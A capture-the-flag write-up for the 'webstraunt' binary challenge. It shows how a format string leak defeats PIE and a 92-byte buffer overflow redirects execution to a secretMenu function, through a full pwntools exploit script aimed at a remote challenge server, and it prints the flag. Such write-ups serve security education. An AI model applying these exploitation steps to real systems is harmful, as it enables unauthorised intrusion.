Do basic file checks
```sh
checksec --file webstraunt
```

```sh
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So it's a 32 bit binary with PIE enabled and no canary and non executaable stack

Run the binary
It asks for us to select from the 4 given options, play with the input, try to give very large input to check for buffer overflow or provide format specifier like `%p` or `%x` to check for format string vulnerabilites.

We find out that its leaking address as format string vulnerabilites are present.
And the second time it asks us for input and we provide a large value, the program crashes so we also have a buffer overflow

Give input as 
```sh
%p|%p|%p|%p|%p|%p
```

And the output is 

```sh
(nil)|(nil)|0x566422bd|(nil)|0xffcd41eb|0x2
```

Run the program in gdb and do the same and examine the leaked values

Give the same input then cancle the program execution with Ctrl + C

I am using gdb-pwndbg

Open the binary and run `info functions`

```sh
0x0000128d  main
0x000012ad  runRestaurant
0x0000138c  secretMenu
```

We functions we need to check

To examine the leaked values do

```sh
x 0x565562bd
```

Output
```
0x565562bd <runRestaurant+16>:	0x2cffc381
```

So the leaked address is at offset of runRestauran() function + 16 address
We know the offset of runRestauran() function is at 0x000012ad. To find offset of 
<runRestaurant+16>, run the command `disassemble runRestaurant`

```sh
   0x000012b5 <+8>:	sub    esp,0x54
   0x000012b8 <+11>:	call   0x1190 <__x86.get_pc_thunk.bx>
   0x000012bd <+16>:	add    ebx,0x2cff
```

So the value of offset is 0x000012bd from the base of binary, so if we need to find base of binary, from the leaked value subtract this offset and we get base of binary.

We can write a script for this, and after we have done this, to the leaked value add the offset of secretMenu() function to call it since the second input vulnerable to buffer overflow

To find the offset of overwriting the EIP with bufferoverflow generate a cyclic pattern 
`cyclic 200`

Run the binary and in second input provide the cyclic patter. We can see the values in EIP are `xaaa`

```sh
*ESP  0xffffce50 ◂— 'yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
*EIP  0x61616178 ('xaaa')
```

Run `cyclic -l xaaa` and we find the offset is at 92 bytes

We can write a script like this

```python
#!/usr/bin/env python3

from pwn import *

exe = './webstraunt'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

host,port= '3.23.56.243',9009

#p = process(exe)
p = remote(host,port)

padding = 92

p.sendlineafter(b'>>>','%3$p|')#since the 3rd %p leaks the value so %3$p
p.recvuntil(b'order:\n')
# 0x000012bd <+16>:	add    ebx,0x2cff  : Leaked offset = <runRestaurant+16> and its offset from base of binary is 0x000012bd
LEAK = int(p.recvuntil(b'|').strip(b'|').decode(),16) - 0x000012bd
info("BASE: %x",LEAK)
#flag = LEAK + elf.symbols.secretMenu  # info functions : 0x0000138c  secretMenu : offset of secret menu is 0x0000138c and this is the function we want to call
flag = LEAK + 0x0000138c # 0x0000138c is the offset of secretMenu() function
info("FLAG: %x",flag)

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    flag,
)

p.sendlineafter(b'>>>',payload)
p.interactive()

```

And we get the flag
flag : texsaw{n0t_web_NOR_a_r3st4urant_3adcdcd2}